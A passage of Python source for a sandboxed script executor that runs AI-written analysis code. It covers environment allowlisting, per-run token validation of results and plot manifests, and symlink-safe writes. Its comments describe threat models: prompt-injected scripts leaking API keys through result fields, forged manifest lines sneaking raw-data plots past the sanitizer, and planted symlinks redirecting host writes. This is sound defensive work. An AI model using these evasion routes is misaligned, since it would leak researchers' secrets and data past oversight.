    """Merge an already-drained prefix with post-kill pipe output safely."""
    if isinstance(prefix, str):
        prefix_bytes = prefix.encode("utf-8", errors="replace")
    else:
        prefix_bytes = bytes(prefix or b"")
    if isinstance(tail, str):
        tail_bytes = tail.encode("utf-8", errors="replace")
    else:
        tail_bytes = bytes(tail or b"")

    kept = bytearray(prefix_bytes[:MAX_CAPTURED_STREAM_BYTES])
    was_truncated = prefix_truncated or len(prefix_bytes) > len(kept)
    remaining = MAX_CAPTURED_STREAM_BYTES - len(kept)
    if remaining > 0:
        kept.extend(tail_bytes[:remaining])
    if len(tail_bytes) > remaining:
        was_truncated = True

    text = bytes(kept).decode("utf-8", errors="replace")
    if was_truncated:
        text += _CAPTURE_TRUNCATION_MARKER.format(
            limit=MAX_CAPTURED_STREAM_BYTES,
        )
    return text

# Name of the payload field the runtime library embeds to establish expected
# per-run framing and reject stale helpers or trivial direct writes. It does
# not attest semantics against code executing in the same interpreter. Starts
# with underscore so it cannot collide with an analysis-schema field name.
RESULT_TOKEN_FIELD = "_token"

# Environment variable name the runtime library reads the token from.
# The R library reads this at source time and then unsets it; Stata
# `.ado` files read it on each invocation (Stata doesn't cleanly
# support env-unset from within the running process).
RUN_TOKEN_ENV_VAR = "SIFT_RUN_TOKEN"
# Separate, non-authoritative cleanup metadata.  Runtime libraries consume and
# remove SIFT_RUN_TOKEN before researcher code starts, so it cannot identify a
# daemonized descendant.  This marker deliberately remains inherited by child
# processes; it is random per run but is neither authentication material nor
# serialized into results/manifests.
_PROCESS_TREE_MARKER_ENV_VAR = "SIFT_PROCESS_TREE_MARKER"


# Env vars we pass through to the R / Stata subprocess. Everything
# NOT in this set is stripped when we build ``subprocess_env``.
#
# Why an allowlist, not ``os.environ`` inheritance: generated
# scripts can call ``Sys.getenv()`` (R) or read shell variables
# (Stata) and stuff the results into any allowed numeric / string
# field that reaches the sanitizer. If the parent process carries
# ``ANTHROPIC_API_KEY`` (it does — the SDK uses it to authenticate),
# AWS credentials, or any other secret, a prompt-injected script can
# exfiltrate them through e.g. a coefficient dict whose keys are
# "leak_bit_0", "leak_bit_1", … survived precisely by the
# dict_numeric sanitizer rule. The filesystem/network sandbox
# doesn't stop this — the bytes never leave the process boundary
# sandbox-exec protects.
#
# The explicit allowlist is PATH (so the interpreter can find
# system tools), HOME (R and Stata read config from here), LANG /
# LC_* (locale — determines number/date formatting), TMPDIR (R and
# Stata write scratch files here), USER / LOGNAME (some R packages
# read them), and SHELL / TERM (completeness; harmless). Everything
# else — including API keys, AWS creds, OpenAI tokens, whatever the
# researcher has in their shell — is dropped.
_SUBPROCESS_ENV_ALLOWLIST: frozenset[str] = frozenset({
    "PATH",
    "HOME",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "LC_COLLATE",
    "LC_MESSAGES",
    "LC_MONETARY",
    "LC_NUMERIC",
    "LC_TIME",
    "TMPDIR",
    "TEMP",
    "TMP",
    "USER",
    "LOGNAME",
    "SHELL",
    "TERM",
    # Windows loader/runtime essentials. These contain no credentials;
    # omitting SystemRoot/ComSpec from a custom CreateProcess environment
    # breaks PowerShell and can prevent system DLL discovery.
    "SystemRoot",
    "WINDIR",
    "SystemDrive",
    "COMSPEC",
    "PATHEXT",
    "PROCESSOR_ARCHITECTURE",
    "NUMBER_OF_PROCESSORS",
    # Required by CreateProcessW when applying an AppContainer profile on
    # current Windows 11. This is a directory location, not a credential, and
    # the AppContainer ACL remains the authority over what the child can read.
    "LOCALAPPDATA",
    # macOS Homebrew Python / R sometimes need this to locate
    # dylibs; Stata needs STATATMP. Low-risk to pass through.
    "DYLD_FALLBACK_LIBRARY_PATH",
    "STATATMP",
    # R-specific: respect the researcher's existing R library
    # paths so Sift doesn't force-reinstall packages they
    # already have.
    "R_LIBS",
    "R_LIBS_USER",
    "R_LIBS_SITE",
})


def _filter_env(parent_env: dict[str, str]) -> dict[str, str]:
    """Return only the entries of ``parent_env`` on the allowlist.

    Kept as a separate function so tests can assert that secrets
    don't leak through, and so a future audit can point at one
    place for "what Claude's scripts can see from the shell".
    """
    if sys.platform.startswith("win"):
        allowed = {name.casefold() for name in _SUBPROCESS_ENV_ALLOWLIST}
        return {k: v for k, v in parent_env.items() if k.casefold() in allowed}
    return {k: v for k, v in parent_env.items() if k in _SUBPROCESS_ENV_ALLOWLIST}


def _generate_run_token() -> str:
    """Return a random per-run framing-integrity token.

    256 bits via `secrets.token_hex(32)`. The runtime library copies it
    into every emitted payload under `_token`; the executor validates
    and strips it before passing the payload on. A malicious script
    that bypasses the runtime library (writing hand-crafted JSON
    straight to `SIFT_RESULT_PATH`) has to either guess a fresh
    256-bit token or introspect the interpreter's loaded environment
    to recover it — the former is infeasible, the latter raises
    attacker cost meaningfully without being an absolute guarantee.
    See ``docs/architecture.md`` "runtime-library contract" for the full
    threat-model discussion.
    """
    return secrets.token_hex(32)


def _runtime_call_hint(language: "Language") -> str:
    """Per-language hint for "your script didn't emit a structured
    result" errors. The fallback strings used to be a binary R-vs-
    Stata branch from before Python was added; without this helper
    a Python script that exits without a ``sift.*`` call gets told
    to call ``sift_result_regress in Stata``, which is unhelpful."""
    if language == "R":
        return "sift$result(...) or sift$from_lm(...) in R"
    if language == "Stata":
        return "sift_result_regress in Stata"
    return "sift.result(...) or sift.from_lm(...) in Python"


def _validate_and_strip_token(
    payload: dict[str, Any], expected_token: str
) -> tuple[dict[str, Any] | None, str | None]:
    """Check ``payload[RESULT_TOKEN_FIELD]`` matches ``expected_token``.

    Returns ``(cleaned_payload, None)`` on success or ``(None, error)``
    on mismatch / missing. The cleaned payload has the token field
    removed so downstream consumers (sanitizer, Claude) never see it.
    """
    if not isinstance(payload, dict):
        return None, (
            f"runtime-library payload must be a JSON object, got "
            f"{type(payload).__name__}"
        )
    got = payload.get(RESULT_TOKEN_FIELD)
    if got is None:
        return None, (
            f"runtime-library payload missing {RESULT_TOKEN_FIELD!r} "
            f"authenticity field — either the script bypassed the "
            f"Sift runtime library (writing JSON directly) or is "
            f"using a library version older than this executor. The "
            f"payload is rejected."
        )
    if not isinstance(got, str) or not secrets.compare_digest(
        got, expected_token
    ):
        return None, (
            f"runtime-library payload {RESULT_TOKEN_FIELD!r} did not "
            f"match the per-run token — the payload may have been "
            f"hand-crafted to bypass the runtime library. Rejected."
        )
    cleaned = {k: v for k, v in payload.items() if k != RESULT_TOKEN_FIELD}
    return cleaned, None


def _format_bad_lines_summary(bad_lines: list[str], payload_count: int) -> str:
    """Render the malformed-lines advisory.

    Shows full detail for the first 5 entries and surfaces the line
    numbers (only) for the next chunk, so a 12-corrupt-line debug
    session reads as ``lines 6,7,8,9,10,11,12 also failed`` rather
    than an opaque ``…``.

    Both head and tail are capped: the tail keeps at most
    ``_BAD_LINES_TAIL_CAP`` line numbers and appends an ``and N more``
    suffix beyond that. A bug emitting thousands of malformed lines
    would otherwise produce a multi-KB string in ``warnings`` /
    ``error``, flooding the model context and the UI. The advisory
    is diagnostic — the researcher reads it once, opens the run dir
    if the line numbers don't tell the whole story.
    """
    head = "; ".join(bad_lines[:5])
    tail_msg = ""
    if len(bad_lines) > 5:
        extra_linenos: list[str] = []
        for entry in bad_lines[5:]:
            # Each entry starts "line N: ..."; pull N back out so
            # the tail stays compact. Defensive: if a future
            # caller adds a non-prefixed entry, the line-number
            # extraction skips it and we fall back to the count.
            if entry.startswith("line "):
                extra_linenos.append(
                    entry.split(":", 1)[0].removeprefix("line ").strip()
                )
        if extra_linenos:
            shown = extra_linenos[:_BAD_LINES_TAIL_CAP]
            overflow = len(extra_linenos) - len(shown)
            if overflow > 0:
                tail_msg = (
                    f" … and lines {','.join(shown)} also failed "
                    f"(+ {overflow} more)"
                )
            else:
                tail_msg = (
                    f" … and lines {','.join(shown)} also failed"
                )
        else:
            tail_msg = f" … and {len(bad_lines) - 5} more"
    return (
        f"{len(bad_lines)} malformed result line(s) skipped "
        f"({payload_count} valid preserved): " + head + tail_msg
    )


# Tail-cap on the bad-line summary's enumerated line numbers. 20 is
# enough to scan visually for clustering ("lines 12-31 all bad → it's
# helper #2") without letting a 1000-bad-line bug ship 1000 line
# numbers into the model's context.
_BAD_LINES_TAIL_CAP = 20


# In-process registry mapping resolved run_dir → per-run token.
# Populated when a run completes (right before the executor returns
# its ExecutionResult); consumed by the runner's ``_capture_plots``
# so it can re-validate each manifest entry's ``_token`` field
# directly, defense-in-depth over the executor's own rewrite.
#
# Why the runner re-validates: ``_filter_plot_manifest`` rewrites
# the on-disk manifest with validated content, but the manifest
# lives in the script-writable ``<run_dir>/_sift_plots/`` directory.
# A script can chmod the manifest read-only or replace it with a
# symlink whose target the host can't safely overwrite. If the
# host's rewrite fails, the original (forged) manifest stays. The
# runner's re-validation guarantees that even a leaked / unwritable
# manifest cannot smuggle a row-level plot past the kind gate.
#
# The token IS NOT plumbed through ToolCallResult.text (the JSON
# the model sees) — exposing it there would let the model emit
# forged entries with the real token. The in-process dict is the
# private channel.
#
# Cleanup: the runner removes its entry after consumption. A turn
# that never reaches ``_capture_plots`` (early failure) leaves an
# entry behind; the registry would grow without bound on long-
# lived sessions. The cap below bounds the worst case by evicting
# the oldest entries when full.
_RUN_TOKEN_REGISTRY: dict[str, str] = {}
_RUN_TOKEN_REGISTRY_CAP = 256


def register_run_token(run_dir: Path, token: str) -> None:
    """Record ``token`` as the framing-integrity token for ``run_dir``.

    Resolves the run_dir before keying so a runner using a
    non-canonical path (relative, symlinked) still finds the entry.
    Evicts the oldest entries past ``_RUN_TOKEN_REGISTRY_CAP``.
    """
    try:
        key = str(run_dir.resolve())
    except OSError:
        key = str(run_dir)
    _RUN_TOKEN_REGISTRY[key] = token
    while len(_RUN_TOKEN_REGISTRY) > _RUN_TOKEN_REGISTRY_CAP:
        # Pop oldest insertion-order entry (Python dicts preserve order).
        _RUN_TOKEN_REGISTRY.pop(next(iter(_RUN_TOKEN_REGISTRY)), None)


def get_run_token(run_dir: Path) -> str | None:
    """Return the token registered for ``run_dir``, or ``None`` if
    no entry exists.

    Non-destructive: both the runner's ``_capture_plots`` and the
    tool layer's ``_summarize_plot_helpers`` need to validate
    entries in the same run. A single consume would race the two
    callers. Cleanup is handled by the registry's LRU eviction cap
    so stale entries don't accumulate.

    Missing entry → caller treats every manifest entry as
    untrusted (fail closed). A re-attached session or replay path
    that lacks the in-process registration drops all helper plots
    rather than silently trusting their kind labels.
    """
    try:
        key = str(run_dir.resolve())
    except OSError:
        key = str(run_dir)
    return _RUN_TOKEN_REGISTRY.get(key)


# Note: an earlier iteration of this module raised a
# ``PlotManifestUnsanitizable`` exception with a write→unlink→
# rename-file→rename-dir cascade when the no-follow rewrite failed.
# That layer is unnecessary under the current design: downstream
# consumers (``SessionRunner._capture_plots`` and
# ``_summarize_plot_helpers``) re-validate each entry's ``_token``
# against the per-run registry, so a forged entry that survives the
# failed rewrite still gets dropped at consumer time. The cascade
# also conflicted with the test contract that the original manifest
# stays on disk when the rewrite is blocked. The downstream
# re-validation is the load-bearing protection.


def _filter_plot_manifest(run_dir: Path, run_token: str) -> int:
    """Drop manifest entries whose ``_token`` is missing or wrong, and
    strip the field from the rest. Returns the number of entries
    dropped.

    The plot manifest at ``<run_dir>/_sift_plots/manifest.jsonl`` is
    the disclosure-control allowlist for vision attachment: anything
    listed there with a ``kind`` in ``_PLOT_KIND_ALLOWLIST`` rides
    the next turn as an image. The manifest file itself sits inside
    the per-run directory, which the analysis script can write, so
    nothing structural prevents a script from saving a raw-data plot
    under ``_sift_plots/`` and appending a hand-crafted manifest line
    that labels it ``coefficients``. That would slip a row-level
    plot past the JSON sanitizer through the vision side channel.
    Same posture as ``_parse_result_jsonl``: helpers stamp every
    entry with the per-run token, the executor validates and strips
    it before any consumer sees the file. A determined script can
    still introspect the runtime library's loaded module state to
    recover the token, but doing so requires explicit code in the
    script the researcher reviews, same trust model as the result-
    payload validation.

    Fail-soft rewrite: the rewrite can fail (script-planted
    symlink refused by no-follow, chmod-blocked file, disk full).
    When it does, the original on-disk manifest stays in place
    and downstream consumers (``SessionRunner._capture_plots`` /
    ``_summarize_plot_helpers``) re-validate each entry's
    ``_token`` against the per-run registry. A forged entry can't
    smuggle through the failed rewrite because the re-validation
    catches it at consumer time.
    """
    import json

    manifest_path = run_dir / "_sift_plots" / "manifest.jsonl"
    if not manifest_path.is_file():
        return 0
    try:
        text = manifest_path.read_text(encoding="utf-8")
    except OSError:
        return 0
    kept: list[dict[str, Any]] = []
    dropped = 0
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        try:
            entry = json.loads(line)
        except json.JSONDecodeError:
            dropped += 1
            continue
        if not isinstance(entry, dict):
            dropped += 1
            continue
        got = entry.get(RESULT_TOKEN_FIELD)
        if not isinstance(got, str) or not secrets.compare_digest(
            got, run_token
        ):
            dropped += 1
            continue
        # Keep ``_token`` in the validated entries. Downstream
        # readers (runner's ``_capture_plots`` and the tool layer's
        # ``_summarize_plot_helpers``) re-validate the token
        # themselves — defense in depth against this rewrite being
        # blocked by a script that chmods the manifest read-only.
        # The token is per-run and never reaches the model: the
        # runner strips it from staged plot metadata, and the
        # summary skips the field. Keeping it on disk lets every
        # consumer make the same authenticity decision, instead of
        # implicitly trusting the rewrite to have happened.
        kept.append(entry)
    # No-follow rewrite: the manifest lives in script-writable
    # territory. A script can symlink ``manifest.jsonl`` →
    # arbitrary user-writable path so the host's write follows
    # and overwrites the symlink target. The helper refuses to
    # follow. If the rewrite fails for any reason (symlink
    # planted, chmod-blocked, disk full), the original file
    # stays in place — downstream readers (runner's
    # ``_capture_plots`` and tools' ``_summarize_plot_helpers``)
    # re-validate the ``_token`` field per entry via the run-token
    # registry, so a forged entry can't smuggle through the failed
    # rewrite. The rewrite is just an optimization to keep the
    # on-disk manifest small; the load-bearing security gate is
    # consumer-side token re-validation.
    #
    # Fail-soft rewrite. If the no-follow write fails (symlink
    # planted, chmod-blocked, disk full), the original file
    # stays on disk; consumers re-validate per-entry against the
    # run-token registry, so a forged entry can't smuggle through.
    _write_text_no_follow(
        manifest_path,
        "".join(json.dumps(e, ensure_ascii=False) + "\n" for e in kept),
    )
    return dropped


# Filename of the per-run manifest recording top-level cwd files this
# run created or modified. The Files panel reads these manifests
# across all runs and excludes the listed files from the researcher's
# view — they're already represented in the script's result card, so
# duplicating them in the panel just adds noise.
CWD_WRITES_MANIFEST_NAME = "cwd_writes.json"


def _write_text_no_follow(path: Path, text: str) -> bool:
    """Write ``text`` to ``path`` without following symlinks.

    The post-run host writes (cwd_writes.json, stdout.log, stderr.log,
    the plot manifest rewrite) all land in script-writable directories.
    A script can plant a symlink at the target path BEFORE exiting,
    pointing at any host-writable file (``~/.ssh/known_hosts``,
    ``~/.config/...``, etc.). A plain ``Path.write_text`` follows
    that symlink and overwrites the target with content the script
    can largely control. The macOS sandbox's
    ``(allow file-write* (subpath run_dir))`` does NOT block symlink
    creation in the run_dir (verified empirically against the actual
    profile shape Sift uses).

    Defense: a shared no-follow opener uses ``O_NOFOLLOW`` on POSIX and
    ``CreateFileW(FILE_FLAG_OPEN_REPARSE_POINT)`` on Windows. If the path
    already exists as a symlink/reparse point, Sift refuses to write before
    truncation — the host never follows the redirect.
    The legitimate happy path (path doesn't exist OR is a regular
    file) writes the content as before.

    We also fstat the opened fd and refuse non-regular files
    (a FIFO planted by the script could let it siphon the host's
    write into a process it controls).

    Returns ``True`` on success, ``False`` when the open / write
    failed for ANY reason. Callers treat False as fail-open for
    the data they were writing (the manifest just stays empty /
    the log stays missing), which is the same posture the prior
    ``except OSError: pass`` blocks already had.
    """
    flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC
    from sift.secure_file import open_regular_no_follow

    try:
        fd = open_regular_no_follow(path, flags, 0o600)
    except OSError:
        return False
    try:
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                fd = -1
                f.write(text)
        except OSError:
            return False
    finally:
        if fd >= 0:
            try:
                os.close(fd)
            except OSError:
                pass
    return True


def _snapshot_cwd_top_level(cwd: Path) -> dict[str, tuple[float, int]]:
    """Snapshot top-level cwd files as a dict of name → (mtime, size).

    Excludes the ``.sift/`` subtree (run dirs, the store, the session
    config), other dotfiles (``.DS_Store``), symlinks, and non-files.
    Failure returns an empty dict — the diff downstream just won't
    tag anything as script-written, which fails open (more files
    visible in the panel, not fewer).
    """
    snapshot: dict[str, tuple[float, int]] = {}
    try:
        for child in cwd.iterdir():
            if child.name.startswith("."):
                continue
            if child.is_symlink() or not child.is_file():
                continue
            try:
                stat = child.stat()
            except OSError:
                continue
            snapshot[child.name] = (stat.st_mtime, stat.st_size)
    except OSError:
        return {}
    return snapshot


def _write_cwd_writes_manifest(
    cwd: Path,
    run_dir: Path,
    pre_snapshot: dict[str, tuple[float, int]],
) -> None:
    """Diff cwd top-level against ``pre_snapshot`` and write a JSON
    manifest of files this run created or modified.

    Manifest format: a list of ``{"name", "mtime", "size", "created"}``
    rows. ``created`` distinguishes the two cases:

      * ``created: true`` — the file was absent before the run.
        Its bytes are entirely the script's output. The Files panel
        filter hides these because they already appear on the
        script's result card (duplicating them in the panel is
        noise, and reading them through bridge endpoints is the
        same SDC-bypass concern as run-dir scripts).

      * ``created: false`` — the file existed before the run and
        the run changed it (mtime or size differs). These are
        audit-relevant: a script that overwrote a researcher's
        source dataset or hand-authored script needs to stay
        visible so the change is noticeable. Hiding modified
        files masks accidental overwrites, which is exactly the
        case where visibility matters most.

    The Files-panel filter (``script_written_cwd_files`` in
    ``session_files.py``) reads this distinction and hides only
    ``created`` rows; ``modified`` rows stay in the panel. Both
    kinds still de-tag automatically when the on-disk file's
    (mtime, size) no longer matches the manifest — so a
    researcher who edits a script-created file makes it visible
    in the panel again.

    Backwards compatibility: ``created`` defaults to ``True`` in
    the reader for old-format rows that lack the field, preserving
    the pre-fix "hide everything tagged" behaviour for sessions
    whose manifests predate this change.

    Best-effort: any I/O failure here is silent. The fallback is
    "this run's writes don't get tagged", which means the panel
    shows them — acceptable as a graceful degradation.
    """
    import json

    try:
        post = _snapshot_cwd_top_level(cwd)
    except Exception:  # noqa: BLE001 — snapshot is best-effort
        return
    rows: list[dict[str, Any]] = []
    for name, (mtime, size) in post.items():
        prev = pre_snapshot.get(name)
        if prev is None:
            rows.append({
                "name": name,
                "mtime": mtime,
                "size": size,
                "created": True,
            })
        elif prev != (mtime, size):
            rows.append({
                "name": name,
                "mtime": mtime,
                "size": size,
                "created": False,
            })
    if not rows:
        return
    manifest_path = run_dir / CWD_WRITES_MANIFEST_NAME
    # No-follow write: the manifest path lives inside run_dir,
    # which is script-writable. A script can plant a symlink at
    # the manifest path before exiting so the host's write
    # follows it and overwrites an arbitrary user file. The
    # helper refuses to follow.
    _write_text_no_follow(
        manifest_path, json.dumps(rows, ensure_ascii=False),
    )


def _parse_result_jsonl(
    text: str, run_token: str
) -> tuple[list[dict[str, Any]], list[str], bool]:
    """Parse a JSONL result file line by line, skipping bad lines.

    A single corrupt line (e.g. a degenerate Stata fit that emitted a
    missing-value marker in ``f_statistic``, or a payload that fails
    authenticity-token validation) used to shadow every later valid
    line in the same batch — the parser would ``break`` and lose the
    rest. The current contract is "skip the bad line, keep going", so
    1 of 8 corrupt lines becomes "7 results + 1 documented error", not
    "0 results + 1 documented error".

    Stops appending payloads once ``MAX_RESULT_PAYLOADS`` is reached
    so a runaway loop in the script can't blow memory / context. The
    file-byte cap is enforced one level up in ``run_script`` before
    calling here.

    Returns ``(payloads, bad_line_messages, truncated)``. ``payloads``
    carries every line that parsed AND token-validated, in emission
    order; ``bad_line_messages`` carries one short string per failed
    line for the caller to surface back to the model; ``truncated``
    is ``True`` iff the entry-count cap kicked in.
    """
    import json

    payloads: list[dict[str, Any]] = []
    bad_lines: list[str] = []
    truncated = False
    for lineno, raw_line in enumerate(text.splitlines(), start=1):
        line = raw_line.strip()
        if not line:
            continue
        if len(payloads) >= MAX_RESULT_PAYLOADS:
            truncated = True
            break
        try:
            raw_payload = json.loads(line)
        except json.JSONDecodeError as je:
            bad_lines.append(f"line {lineno}: {je.msg} at col {je.colno}")
            continue
        cleaned, auth_err = _validate_and_strip_token(raw_payload, run_token)
        if auth_err is not None:
            bad_lines.append(f"line {lineno}: {auth_err}")
            continue
        if cleaned is None:
            bad_lines.append(
                f"line {lineno}: payload authentication returned no payload"
            )
            continue
        payloads.append(cleaned)
    return payloads, bad_lines, truncated


@lru_cache(maxsize=1)
def cached_environment() -> Environment:
    """Return a process-local cached runtime probe.

    ``detect_environment()`` spawns multiple subprocesses (R package
    probe, Python package probe, prefix detection), which is fine at
    app startup but expensive to repeat on every ``submit_script``.
    Caching here keeps back-to-back regressions from paying that fixed
    tax every time.

    Public (not ``_``-prefixed): ``system_prompt.runtime_environment_listing()``
    reuses this same cache so opening a session doesn't pay the probe
    twice — once for the system prompt's runtime listing, once again
    on the session's first script run. Both call sites want the SAME
    process-lifetime answer, not independently-memoized ones, since a
    researcher's installed runtimes don't change mid-session.

    Callers with an already-known environment can still pass ``env=``
    to ``run_script`` and bypass this cache entirely.
    """
    return detect_environment()


def clear_environment_cache() -> None:
    """Drop the cached environment probe.

    Test hook today; also useful for a future explicit "refresh local
    runtimes" UI action if Sift grows one.
    """
    cached_environment.cache_clear()


def _build_environment_metadata(
    env: Environment, language: "Language",
) -> dict[str, Any]:
    """Snapshot the detected runtime state for the model-visible
    ``ExecutionResult.environment`` field.

    Why this lives on every response: every diagnostic spiral we've
    seen on script failures comes from the model not knowing which
    interpreter Sift picked or what it provided. With this snapshot
    the model can answer "is python3 even there", "is pandas
    installed", "did the sandbox probe reject any candidate" without
    speculating. None of the fields touch researcher data — they're
    interpreter paths, version strings, package names, and the
    probe's launcher stderr — so the snapshot is phase-safe to
    forward unredacted regardless of where in script execution a
    failure landed.

    Language-relevant fields are at the top level; the other two
    languages are summarised under ``other_runtimes`` so a Python run
    doesn't bury Python state under a Stata block but the model can
    still see what's installed if it wants to suggest switching
    languages.
    """
    from sift.env_detect import (
        _PYTHON_REQUIRED_PACKAGES,
        python_sandbox_probe_results,
    )

    def _tool_view(tool, *, include_packages: bool) -> dict[str, Any]:
        if tool is None:
            return {"present": False}
        view: dict[str, Any] = {
            "present": True,
            "binary": tool.binary,
            "version": tool.version,
        }
        if include_packages:
            view["installed_required"] = sorted(
                set(_PYTHON_REQUIRED_PACKAGES if tool.name == "Python"
                    else ())
                - set(tool.missing_packages or ())
            )
            view["missing_required"] = sorted(tool.missing_packages or ())
            view["missing_optional"] = sorted(
                tool.optional_missing_packages or ()
            )
            # ``sys.prefix`` is the first entry of ``extra_read_paths``
            # for the Python tool (see ``env_detect._python_prefixes``).
            # Surfacing it tells the model exactly which interpreter
            # install the executor is reading stdlib from, which is the
            # missing puzzle piece when shadowed binaries (xcrun stub
            # vs Homebrew) produce surprising behaviour.
            if tool.name == "Python" and tool.extra_read_paths:
                view["sys_prefix"] = tool.extra_read_paths[0]
        return view

    primary: dict[str, Any]
    others: dict[str, Any]
    if language == "Python":
        primary = _tool_view(env.python, include_packages=True)
        others = {
            "R": _tool_view(env.r, include_packages=False),
            "Stata": _tool_view(env.stata, include_packages=False),
        }
    elif language == "R":
        primary = _tool_view(env.r, include_packages=False)
        others = {
            "Python": _tool_view(env.python, include_packages=True),
            "Stata": _tool_view(env.stata, include_packages=False),
        }
    else:  # Stata
        primary = _tool_view(env.stata, include_packages=False)
        others = {
            "Python": _tool_view(env.python, include_packages=True),
            "R": _tool_view(env.r, include_packages=False),
        }

    metadata: dict[str, Any] = {
        "language": language,
        "interpreter": primary,
        "sandbox_exec_present": env.sandbox_exec is not None,
        "other_runtimes": others,
    }

    # python3 candidates the sandbox probe rejected — only relevant
    # to Python runs and to "no python3 found" diagnostic paths, but
    # included on every response so a researcher who switches
    # languages mid-session still sees the rejection if it explains
    # a prior Python failure. Each entry has the candidate binary and
    # the *tail* of the failing stderr (the proximate cause); the
    # stderr is phase-safe to forward verbatim because the probe runs
    # ``binary -c "print(1)"`` against no researcher data.
    probe_failures = [
        {
            "binary": path,
            "stderr_excerpt": (stderr or "").strip().splitlines()[-1]
            if (stderr or "").strip()
            else "",
        }
        for path, (ok, stderr) in python_sandbox_probe_results().items()
        if not ok
    ]
    if probe_failures:
        metadata["python_sandbox_probe_failures"] = probe_failures

    return metadata


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

@dataclass
class ExecutionResult:
    """Outcome of running one script.

    - ``ok`` is ``True`` iff the subprocess exited 0 AND at least one
      valid JSON payload was written to the result file. Fatal
      deviations (timeout, non-zero exit, missing result file, empty
      result file, every line malformed) flip ``ok=False`` and fill
      ``error``.
    - ``warnings`` carries non-fatal advisories about the run — most
      commonly malformed JSONL lines that were skipped while OTHER
      lines parsed and validated cleanly. A run with 7 valid payloads
      and 1 malformed line stays ``ok=True`` and the malformed-line
      summary lands here, not in ``error``: the legitimate output
      should reach the caller without being demoted to
      "execution_failed". When NO payloads survive, the malformed-line
      message is upgraded into ``error`` instead, since it is then the
      only signal the caller has.
    - ``raw_stdout`` / ``raw_stderr`` are what the researcher sees in the
      TUI. Never routed to the sanitizer.
    - ``result_payloads`` is the list of parsed JSON payloads from the
      result file, in emission order, intended for ``sanitize()``. Still
      raw, no SDC rules applied here. The result file is JSONL: one
      object per line. A single-helper script produces one entry; a
      script that calls multiple ``sift_result_*`` helpers produces one
      entry per call. Empty list means no payload was emitted, which
      is treated as a script error in the success path.
    - ``run_dir`` and ``script_path`` are kept around for audit.
    - ``duration_seconds`` is wall-clock time inside the subprocess.
    - ``environment`` is a snapshot of the detected runtime state at
      the moment the executor decided to dispatch (or refused to):
      the interpreter binary + version + sys.prefix, what packages
      are installed vs missing, whether ``sandbox-exec`` is present,
      and any rejected python3 candidates from the sandbox probe.
      Surfacing this on every response lets the model self-diagnose
      environment-shaped failures (Apple xcrun stub rejected,
      pandas missing, etc.) without speculating — the most common
      reason a diagnostic conversation spirals is the model can't
      see which interpreter Sift actually picked or what it
      provided.
    """
    ok: bool
    language: Language
    raw_stdout: str
    raw_stderr: str
    exit_code: int | None
    result_payloads: list[dict]
    error: str | None
    run_dir: Path
    script_path: Path | None
    duration_seconds: float
    warnings: list[str] = field(default_factory=list)
    environment: dict[str, Any] | None = None
    # Buffer-split stderr (Python only today). ``pre_user_stderr`` is
    # phase 0 + phase A — captured BEFORE user code ran, so the bytes
    # cannot contain researcher data. Safe to forward unredacted to
    # the model. ``user_stderr`` is phase B — captured during user
    # code; potentially script-controlled, requires frame
    # classification before any unredacted forwarding. For R / Stata
    # the split isn't wired yet; pre_user_stderr carries the full
    # pipe stderr and user_stderr is empty, which causes the error-
    # summary layer to apply the legacy full-redaction posture.
    pre_user_stderr: str = ""
    user_stderr: str = ""


def _interpreter_preflight_error(
    language: Language, env: Environment,
) -> str | None:
    """Return the actionable runtime error before probing confinement.

    A sandbox is irrelevant when the requested interpreter cannot run at
    all. Checking this first also prevents a nested/containerized host from
    masking a clear "Python is missing packages" diagnosis with its own
    sandbox-baseline failure.
    """
    if language == "R" and env.r is None:
        return (
            "Rscript not found on this machine. Install R from "
            "https://cran.r-project.org only if you need R-language "
            "execution; otherwise use an available Python or Stata runtime."
        )
    if language == "Stata" and env.stata is None:
        return (
            "Stata-language execution is unavailable because Stata is not "
            "installed on this machine. Sift can still open and analyze .dta "
            "files with its bundled reader; run this analysis in an available "
            "Python or R runtime. Install a licensed copy of Stata only if "
            "you specifically need Stata-language execution."
        )
    if language != "Python":
        return None
    if env.python is None:
        from sift.env_detect import python_sandbox_probe_results
        probe_failures = [
            (path, stderr)
            for path, (ok, stderr) in python_sandbox_probe_results().items()
            if not ok
        ]
        if probe_failures:
            lines = [
                "python3 was found on PATH but every candidate failed to "
                "start under the Sift sandbox. Install a real Python via "
                "Homebrew (``brew install python``) or python.org and "
                "re-launch Sift.",
                "",
                "Probe failures:",
            ]
            for path, stderr in probe_failures:
                tail = (stderr or "").strip().splitlines()
                snippet = tail[-1] if tail else "(no stderr captured)"
                lines.append(f"  {path}: {snippet}")
            return "\n".join(lines)
        return (
            "python3 not found on PATH and no usable bundled Python analysis "
            "runtime was found. Released Sift "
            "builds include one; reinstall Sift if its bundled runtime is "
            "missing or damaged. In a source/development run, install "
            "Python 3, or use an available R or Stata runtime."
        )
    hard_missing = sorted(
        set(env.python.missing_packages) & _PYTHON_HARD_REQUIRED
    )
    if hard_missing:
        return (
            "Python is installed at "
            f"{env.python.binary} but the Sift runtime needs these "
            f"packages: {', '.join(hard_missing)}. Install them with "
            f"``{env.python.binary} -m pip install "
            f"{' '.join(hard_missing)}`` and re-launch Sift."
        )
    return None


def _sandbox_presence_error(env: Environment) -> str | None:
    """Return an error when this platform has no confinement backend.

    Presence is intentionally checked before interpreter health: when no
    sandbox exists, *no* language can run and that is the primary failure.
    Live backend health is checked later, after interpreter health, so a
    nested host sandbox cannot hide a more actionable missing-runtime or
    missing-package diagnosis.
    """
    platform_name = sys.platform
    if platform_name == "darwin":
        if env.sandbox_exec is not None:
            return None
        return (
            "sandbox-exec not available on this system — Sift refuses "
            "to run scripts unsandboxed. This binary lives at "
            "/usr/bin/sandbox-exec and should always be present on "
            "macOS; if it's missing, something unusual has happened "
            "to this machine's base install."
        )
    if platform_name.startswith("linux"):
        if env.bwrap is not None:
            return None
        return (
            "bubblewrap (bwrap) not available on this system — Sift "
            "refuses to run scripts unsandboxed. Install it with your "
            "distribution's package manager (e.g. ``apt install "
            "bubblewrap``, ``dnf install bubblewrap``, ``pacman -S "
            "bubblewrap``) and re-launch Sift. bwrap is the Linux "
            "equivalent of macOS's sandbox-exec — Sift's confinement "
            "guarantees depend on it being present."
        )
    if platform_name.startswith("win"):
        if env.appcontainer_support:
            return None
        return (
            "Windows AppContainer sandbox support is not available "
